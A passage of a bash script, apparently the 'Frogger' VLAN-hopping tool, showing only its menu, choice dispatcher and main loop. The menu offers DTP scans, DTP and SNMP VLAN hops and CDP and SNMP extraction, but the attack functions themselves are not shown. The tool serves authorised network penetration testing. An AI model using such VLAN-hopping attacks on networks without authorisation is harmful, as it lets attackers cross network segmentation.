printf '\r%s \n\n' "${BRIGHT}${MAGENTA}[5]${NORMAL} - CDP Extract - Extract just CDP device information - (${GREEN}Passive Check${NORMAL})"
printf '\r%s \n\n' "${BRIGHT}${WHITE}[6]${NORMAL} - SNMP Extract - Extract VLAN information using SNMP - (${GREEN}Read-Only${NORMAL})"
printf '\r%s \n\n' "${BRIGHT}${RED}[7]${NORMAL} - Exit script"
}

read_mainoptions(){
printf '\r%s\n' "${BRIGHT}${RED}----------------------------------------------------------------------------------------------------"
TXT=$(printf '\r%s %s \n' "${BRIGHT}${RED}[?]${NORMAL}" "${BRIGHT}Enter choice: [ 1 - 7 ]${NORMAL}")

        local choice
        read -p "$TXT" choice
		
        case $choice in
                1) clear ; printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} 1. DTP Scan Selected." ; one ;;
                2) clear ; printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} 2. DTP VLAN Hop with CDP Selected." ; two ;;
                3) clear ; printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} 3. DTP VLAN Hop without CDP Selected." ; three ;;
                4) clear ; printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} 4. SNMP VLAN Hop Selected." ; four;;
                5) clear ; printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} 5. CDP Extract Selected." ; five ;;
				6) clear ; printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} 6. SNMP Extract Selected." ; six ;;
                7) printf '\n\n \r%s %s\n\n' "${BRIGHT}${BLUE}[i]${NORMAL} Frogger script exited."; rm *.tmp 2>/dev/null ; exit 0 ;;
                *) printf '\n\n \r%s %s\n\n' "${BRIGHT}${RED}[!]${NORMAL} Invalid menu selection." && sleep 2
        esac
}

# CTL C aborts script at any point
trap control_c SIGINT

while true
do
        show_mainmenu
        read_mainoptions
done

#remove tmp files
rm *.tmp 2>/dev/null

#END